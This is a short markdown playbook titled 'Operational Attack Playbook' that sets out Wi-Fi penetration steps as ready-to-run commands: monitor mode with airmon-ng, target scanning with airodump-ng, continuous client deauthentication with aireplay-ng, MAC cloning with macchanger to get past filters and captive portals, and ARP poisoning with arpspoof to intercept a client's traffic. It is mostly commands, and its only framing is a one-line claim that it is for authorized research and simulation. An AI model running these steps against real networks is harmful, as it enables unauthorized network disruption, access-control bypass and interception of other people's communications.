# Operational Attack Playbook: Wi-Fi Bypass & Network Penetration

Documented technical methodology for authorized research and autonomous simulation.

## 1. Wireless Interface Preparation & Monitor Mode
To begin packet capture and analysis, the wireless interface must be placed into monitor mode:
```bash
# Check interfering processes
airmon-ng check kill

# Enable monitor mode on interface (e.g., wlan0)
airmon-ng start wlan0
# Resulting monitor interface usually designated as wlan0mon
```

## 2. Target Discovery & Station Mapping
Scan for target networks and identify associated clients:
```bash
# Scan specific channel and BSSID
airodump-ng --bssid [TARGET_BSSID] --channel [CHANNEL] wlan0mon
```
*Note the active client MAC addresses (`STATION`) communicating with the target Access Point.*

## 3. Deauthentication Attack (Client Disassociation)
To capture handshakes or force client re-authentication:
```bash
aireplay-ng --deauth 0 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
```

## 4. MAC Spoofing & Identity Cloning
To bypass MAC address filtering or captive portal whitelists:
```bash
# Bring interface down
ifconfig wlan0 down

# Change MAC address to match the active authenticated client
macchanger -m [AUTHENTICATED_CLIENT_MAC] wlan0

# Bring interface back up
ifconfig wlan0 up
```

## 5. Session Hijacking & Gateway Interception (ARP Poisoning)
Once associated with the spoofed MAC:
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison ARP cache between target and gateway
arpspoof -i wlan0 -t [GATEWAY_IP] [CLIENT_IP]
arpspoof -i wlan0 -t [CLIENT_IP] [GATEWAY_IP]
```
